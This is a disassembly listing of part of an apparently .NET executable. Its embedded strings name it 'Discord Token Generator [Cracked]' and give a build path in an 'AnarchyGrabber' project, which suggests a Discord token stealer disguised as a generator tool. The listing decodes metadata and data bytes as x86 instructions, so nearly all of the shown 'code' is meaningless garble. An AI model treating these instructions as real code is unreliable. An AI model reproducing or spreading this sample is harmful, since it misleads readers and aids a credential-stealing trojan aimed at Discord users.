  4036f9:	79 08                	jns    0x403703
  4036fb:	b7 7a                	mov    $0x7a,%bh
  4036fd:	5c                   	pop    %esp
  4036fe:	56                   	push   %esi
  4036ff:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  403702:	89 08                	mov    %ecx,(%eax)
  403704:	b0 3f                	mov    $0x3f,%al
  403706:	5f                   	pop    %edi
  403707:	7f 11                	jg     0x40371a
  403709:	d5 0a                	aad    $0xa
  40370b:	3a 01                	cmp    (%ecx),%al
  40370d:	00 02                	add    %al,(%edx)
  40370f:	06                   	push   %es
  403710:	02 06                	add    (%esi),%al
  403712:	06                   	push   %es
  403713:	15 12 51 01 0e       	adc    $0xe015112,%eax
  403718:	07                   	pop    %es
  403719:	06                   	push   %es
  40371a:	15 12 51 01 12       	adc    $0x12015112,%eax
  40371f:	10 02                	adc    %al,(%edx)
  403721:	06                   	push   %es
  403722:	0e                   	push   %cs
  403723:	03 00                	add    (%eax),%eax
  403725:	00 02                	add    %al,(%edx)
  403727:	04 00                	add    $0x0,%al
  403729:	01 01                	add    %eax,(%ecx)
  40372b:	02 09                	add    (%ecx),%cl
  40372d:	00 02                	add    %al,(%edx)
  40372f:	15 12 51 01 0e       	adc    $0xe015112,%eax
  403734:	0e                   	push   %cs
  403735:	02 05 00 01 01 1d    	add    0x1d010100,%al
  40373b:	0e                   	push   %cs
  40373c:	03 00                	add    (%eax),%eax
  40373e:	00 01                	add    %al,(%ecx)
  403740:	06                   	push   %es
  403741:	20 03                	and    %al,(%ebx)
  403743:	01 0e                	add    %ecx,(%esi)
  403745:	0e                   	push   %cs
  403746:	02 08                	add    (%eax),%cl
  403748:	00 01                	add    %al,(%ecx)
  40374a:	01 15 12 51 01 0e    	add    %edx,0xe015112
  403750:	03 08                	add    (%eax),%ecx
  403752:	00 02                	add    %al,(%edx)
  403754:	08 01                	or     %al,(%ecx)
  403756:	00 08                	add    %cl,(%eax)
  403758:	00 00                	add    %al,(%eax)
  40375a:	00 00                	add    %al,(%eax)
  40375c:	00 1e                	add    %bl,(%esi)
  40375e:	01 00                	add    %eax,(%eax)
  403760:	01 00                	add    %eax,(%eax)
  403762:	54                   	push   %esp
  403763:	02 16                	add    (%esi),%dl
  403765:	57                   	push   %edi
  403766:	72 61                	jb     0x4037c9
  403768:	70 4e                	jo     0x4037b8
  40376a:	6f                   	outsl  %ds:(%esi),(%dx)
  40376b:	6e                   	outsb  %ds:(%esi),(%dx)
  40376c:	45                   	inc    %ebp
  40376d:	78 63                	js     0x4037d2
  40376f:	65 70 74             	gs jo  0x4037e6
  403772:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  403779:	77 73                	ja     0x4037ee
  40377b:	01 08                	add    %ecx,(%eax)
  40377d:	01 00                	add    %eax,(%eax)
  40377f:	07                   	pop    %es
  403780:	01 00                	add    %eax,(%eax)
  403782:	00 00                	add    %al,(%eax)
  403784:	00 26                	add    %ah,(%esi)
  403786:	01 00                	add    %eax,(%eax)
  403788:	21 44 69 73          	and    %eax,0x73(%ecx,%ebp,2)
  40378c:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40378f:	64 20 54 6f 6b       	and    %dl,%fs:0x6b(%edi,%ebp,2)
  403794:	65 6e                	outsb  %gs:(%esi),(%dx)
  403796:	20 47 65             	and    %al,0x65(%edi)
  403799:	6e                   	outsb  %ds:(%esi),(%dx)
  40379a:	65 72 61             	gs jb  0x4037fe
  40379d:	74 6f                	je     0x40380e
  40379f:	72 20                	jb     0x4037c1
  4037a1:	5b                   	pop    %ebx
  4037a2:	43                   	inc    %ebx
  4037a3:	72 61                	jb     0x403806
  4037a5:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4037a8:	64 5d                	fs pop %ebp
  4037aa:	00 00                	add    %al,(%eax)
  4037ac:	30 01                	xor    %al,(%ecx)
  4037ae:	00 2b                	add    %ch,(%ebx)
  4037b0:	44                   	inc    %esp
  4037b1:	69 73 63 6f 72 64 20 	imul   $0x2064726f,0x63(%ebx),%esi
  4037b8:	54                   	push   %esp
  4037b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ba:	6b 65 6e 20          	imul   $0x20,0x6e(%ebp),%esp
  4037be:	47                   	inc    %edi
  4037bf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4037c1:	65 72 61             	gs jb  0x403825
  4037c4:	74 6f                	je     0x403835
  4037c6:	72 20                	jb     0x4037e8
  4037c8:	43                   	inc    %ebx
  4037c9:	72 61                	jb     0x40382c
  4037cb:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4037ce:	64 20 62 79          	and    %ah,%fs:0x79(%edx)
  4037d2:	20 5b 74             	and    %bl,0x74(%ebx)
  4037d5:	75 61                	jne    0x403838
  4037d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4037d8:	36 36 5d             	ss ss pop %ebp
  4037db:	00 00                	add    %al,(%eax)
  4037dd:	05 01 00 00 00       	add    $0x1,%eax
  4037e2:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4037e5:	00 17                	add    %dl,(%edi)
  4037e7:	44                   	inc    %esp
  4037e8:	69 73 63 6f 72 64 20 	imul   $0x2064726f,0x63(%ebx),%esi
  4037ef:	54                   	push   %esp
  4037f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4037f1:	6b 65 6e 20          	imul   $0x20,0x6e(%ebp),%esp
  4037f5:	47                   	inc    %edi
  4037f6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4037f8:	20 54 65 61          	and    %dl,0x61(%ebp,%eiz,2)
  4037fc:	6d                   	insl   (%dx),%es:(%edi)
  4037fd:	2e 00 00             	add    %al,%cs:(%eax)
  403800:	1c 01                	sbb    $0x1,%al
  403802:	00 17                	add    %dl,(%edi)
  403804:	44                   	inc    %esp
  403805:	69 73 63 6f 72 64 20 	imul   $0x2064726f,0x63(%ebx),%esi
  40380c:	54                   	push   %esp
  40380d:	6f                   	outsl  %ds:(%esi),(%dx)
  40380e:	6b 65 6e 20          	imul   $0x20,0x6e(%ebp),%esp
  403812:	47                   	inc    %edi
  403813:	65 6e                	outsb  %gs:(%esi),(%dx)
  403815:	65 72 61             	gs jb  0x403879
  403818:	74 6f                	je     0x403889
  40381a:	72 00                	jb     0x40381c
  40381c:	00 1d 01 00 18 43    	add    %bl,0x43180001
  403822:	6f                   	outsl  %ds:(%esi),(%dx)
  403823:	70 79                	jo     0x40389e
  403825:	72 69                	jb     0x403890
  403827:	67 68 74 20 40 32    	addr16 push $0x32402074
  40382d:	30 31                	xor    %dh,(%ecx)
  40382f:	39 20                	cmp    %esp,(%eax)
  403831:	5b                   	pop    %ebx
  403832:	74 75                	je     0x4038a9
  403834:	61                   	popa
  403835:	6e                   	outsb  %ds:(%esi),(%dx)
  403836:	36 36 5d             	ss ss pop %ebp
  403839:	00 00                	add    %al,(%eax)
  40383b:	0b 01                	or     (%ecx),%eax
  40383d:	00 06                	add    %al,(%esi)
  40383f:	74 75                	je     0x4038b6
  403841:	61                   	popa
  403842:	6e                   	outsb  %ds:(%esi),(%dx)
  403843:	36 36 00 00          	ss add %al,%ss:(%eax)
  403847:	29 01                	sub    %eax,(%ecx)
  403849:	00 24 61             	add    %ah,(%ecx,%eiz,2)
  40384c:	31 39                	xor    %edi,(%ecx)
  40384e:	30 36                	xor    %dh,(%esi)
  403850:	39 62 62             	cmp    %esp,0x62(%edx)
  403853:	2d 62 64 39 61       	sub    $0x61396462,%eax
  403858:	2d 34 63 61 38       	sub    $0x38616334,%eax
  40385d:	2d 62 38 65 62       	sub    $0x62653862,%eax
  403862:	2d 35 38 36 32       	sub    $0x32363835,%eax
  403867:	64 64 61             	fs fs popa
  40386a:	34 34                	xor    $0x34,%al
  40386c:	63 30                	arpl   %esi,(%eax)
  40386e:	32 00                	xor    (%eax),%al
  403870:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  403873:	00 07                	add    %al,(%edi)
  403875:	35 2e 32 2e 31       	xor    $0x312e322e,%eax
  40387a:	2e 31 00             	xor    %eax,%cs:(%eax)
  40387d:	00 49 01             	add    %cl,0x1(%ecx)
  403880:	00 1a                	add    %bl,(%edx)
  403882:	2e 4e                	cs dec %esi
  403884:	45                   	inc    %ebp
  403885:	54                   	push   %esp
  403886:	46                   	inc    %esi
  403887:	72 61                	jb     0x4038ea
  403889:	6d                   	insl   (%dx),%es:(%edi)
  40388a:	65 77 6f             	gs ja  0x4038fc
  40388d:	72 6b                	jb     0x4038fa
  40388f:	2c 56                	sub    $0x56,%al
  403891:	65 72 73             	gs jb  0x403907
  403894:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40389b:	35 01 00 54 0e       	xor    $0xe540001,%eax
  4038a0:	14 46                	adc    $0x46,%al
  4038a2:	72 61                	jb     0x403905
  4038a4:	6d                   	insl   (%dx),%es:(%edi)
  4038a5:	65 77 6f             	gs ja  0x403917
  4038a8:	72 6b                	jb     0x403915
  4038aa:	44                   	inc    %esp
  4038ab:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  4038b2:	61                   	popa
  4038b3:	6d                   	insl   (%dx),%es:(%edi)
  4038b4:	65 12 2e             	adc    %gs:(%esi),%ch
  4038b7:	4e                   	dec    %esi
  4038b8:	45                   	inc    %ebp
  4038b9:	54                   	push   %esp
  4038ba:	20 46 72             	and    %al,0x72(%esi)
  4038bd:	61                   	popa
  4038be:	6d                   	insl   (%dx),%es:(%edi)
  4038bf:	65 77 6f             	gs ja  0x403931
  4038c2:	72 6b                	jb     0x40392f
  4038c4:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  4038c7:	35 04 01 00 00       	xor    $0x104,%eax
  4038cc:	00 08                	add    %cl,(%eax)
  4038ce:	01 00                	add    %eax,(%eax)
	...
  4038dc:	a8 04                	test   $0x4,%al
  4038de:	47                   	inc    %edi
  4038df:	b6 00                	mov    $0x0,%dh
  4038e1:	00 00                	add    %al,(%eax)
  4038e3:	00 02                	add    %al,(%edx)
  4038e5:	00 00                	add    %al,(%eax)
  4038e7:	00 92 00 00 00 10    	add    %dl,0x10000000(%edx)
  4038ed:	39 00                	cmp    %eax,(%eax)
  4038ef:	00 10                	add    %dl,(%eax)
  4038f1:	1b 00                	sbb    (%eax),%eax
	...
  4038ff:	00 10                	add    %dl,(%eax)
	...
  40390d:	00 00                	add    %al,(%eax)
  40390f:	00 52 53             	add    %dl,0x53(%edx)
  403912:	44                   	inc    %esp
  403913:	53                   	push   %ebx
  403914:	83 db 80             	sbb    $0xffffff80,%ebx
  403917:	94                   	xchg   %eax,%esp
  403918:	62 28                	bound  %ebp,(%eax)
  40391a:	77 42                	ja     0x40395e
  40391c:	a0 87 4a 32 0e       	mov    0xe324a87,%al
  403921:	f4                   	hlt
  403922:	a3 4e 01 00 00       	mov    %eax,0x14e
  403927:	00 43 3a             	add    %al,0x3a(%ebx)
  40392a:	5c                   	pop    %esp
  40392b:	55                   	push   %ebp
  40392c:	73 65                	jae    0x403993
  40392e:	72 73                	jb     0x4039a3
  403930:	5c                   	pop    %esp
  403931:	74 75                	je     0x4039a8
  403933:	6b 69 6e 5c          	imul   $0x5c,0x6e(%ecx),%ebp
  403937:	44                   	inc    %esp
  403938:	65 73 6b             	gs jae 0x4039a6
  40393b:	74 6f                	je     0x4039ac
  40393d:	70 5c                	jo     0x40399b
  40393f:	43                   	inc    %ebx
  403940:	72 61                	jb     0x4039a3
  403942:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  403945:	6e                   	outsb  %ds:(%esi),(%dx)
  403946:	67 5c                	addr16 pop %esp
  403948:	41                   	inc    %ecx
  403949:	6e                   	outsb  %ds:(%esi),(%dx)
  40394a:	61                   	popa
  40394b:	72 63                	jb     0x4039b0
  40394d:	68 79 47 72 61       	push   $0x61724779
  403952:	62 62 65             	bound  %esp,0x65(%edx)
  403955:	72 5c                	jb     0x4039b3
  403957:	41                   	inc    %ecx
  403958:	6e                   	outsb  %ds:(%esi),(%dx)
  403959:	61                   	popa
  40395a:	72 63                	jb     0x4039bf
  40395c:	68 79 47 72 61       	push   $0x61724779
  403961:	62 62 65             	bound  %esp,0x65(%edx)
  403964:	72 2d                	jb     0x403993
  403966:	6d                   	insl   (%dx),%es:(%edi)
  403967:	61                   	popa
  403968:	73 74                	jae    0x4039de
  40396a:	65 72 5c             	gs jb  0x4039c9
  40396d:	41                   	inc    %ecx
  40396e:	6e                   	outsb  %ds:(%esi),(%dx)
  40396f:	61                   	popa
  403970:	72 63                	jb     0x4039d5
  403972:	68 79 47 72 61       	push   $0x61724779
  403977:	62 62 65             	bound  %esp,0x65(%edx)
  40397a:	72 5c                	jb     0x4039d8
  40397c:	6f                   	outsl  %ds:(%esi),(%dx)
  40397d:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  403980:	44                   	inc    %esp
  403981:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  403985:	5c                   	pop    %esp
  403986:	44                   	inc    %esp
  403987:	69 73 63 6f 72 64 20 	imul   $0x2064726f,0x63(%ebx),%esi
  40398e:	54                   	push   %esp
  40398f:	6f                   	outsl  %ds:(%esi),(%dx)
  403990:	6b 65 6e 20          	imul   $0x20,0x6e(%ebp),%esp
  403994:	47                   	inc    %edi
  403995:	65 6e                	outsb  %gs:(%esi),(%dx)
  403997:	65 72 61             	gs jb  0x4039fb
  40399a:	74 6f                	je     0x403a0b
  40399c:	72 2e                	jb     0x4039cc
  40399e:	70 64                	jo     0x403a04
  4039a0:	62 00                	bound  %eax,(%eax)
  4039a2:	ca 39 00             	lret   $0x39
	...
  4039ad:	00 e4                	add    %ah,%ah
  4039af:	39 00                	cmp    %eax,(%eax)
  4039b1:	00 00                	add    %al,(%eax)
  4039b3:	20 00                	and    %al,(%eax)
	...
  4039c9:	00 d6                	add    %dl,%dh
  4039cb:	39 00                	cmp    %eax,(%eax)
	...
  4039d5:	00 00                	add    %al,(%eax)
  4039d7:	00 5f 43             	add    %bl,0x43(%edi)
  4039da:	6f                   	outsl  %ds:(%esi),(%dx)
  4039db:	72 45                	jb     0x403a22
  4039dd:	78 65                	js     0x403a44
  4039df:	4d                   	dec    %ebp
  4039e0:	61                   	popa
  4039e1:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  4039e8:	72 65                	jb     0x403a4f
  4039ea:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  4039ee:	6c                   	insb   (%dx),%es:(%edi)
  4039ef:	00 00                	add    %al,(%eax)
  4039f1:	00 00                	add    %al,(%eax)
  4039f3:	00 00                	add    %al,(%eax)
  4039f5:	00 ff                	add    %bh,%bh
  4039f7:	25 00 20 40 00       	and    $0x402000,%eax
